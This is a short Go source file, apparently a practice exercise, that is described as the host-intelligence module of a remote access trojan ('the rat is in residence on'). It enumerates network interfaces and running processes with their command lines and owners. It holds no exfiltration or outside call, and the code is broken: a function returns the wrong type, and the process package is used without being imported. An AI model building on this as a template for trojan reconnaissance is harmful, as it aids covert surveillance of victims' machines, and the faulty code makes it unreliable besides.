/*/
This file contains the code for gathering host intelligence
/*/

package go_practice

// import the libraries we need
import (
	"net"
	"strconv"
)

/*
Function to gather information about the host
the rat is in residence on
*/
func gather_intel(intel_struct HostIntel) (HostIntel, error) {
	// Get all network interfaces
	interfaces, _ := net.Interfaces()
	return interfaces
}

// Procs returns a slice of process objects
// Look at "PrintProcSummary()" and "PrintProcDetails()" for examples on displaying the process info
func Procs() ([][]string, error) {
	procs, err := process.Processes()
	if err != nil {
		return nil, err
	}
	processes := make([][]string, 0)
	for _, ps := range procs {
		// assign each process value to a variable
		i := ps.Pid
		pid := strconv.Itoa(int(i))

		i, _ = ps.Ppid()
		pPid := strconv.Itoa(int(i))

		pName, _ := ps.Name()
		pCmdLine, _ := ps.Cmdline()

		//pCreate, _ := ps.CreateTime()

		pUser, err := ps.Username()
		if err != nil {
			pUser = "Access Denied"
		}

		p := make([]string, 0)
		p = append(p, pid, pPid, pName, pCmdLine, pUser)

		// append each process, p, to the processes slice
		processes = append(processes, p)
	}
	return processes, nil
}
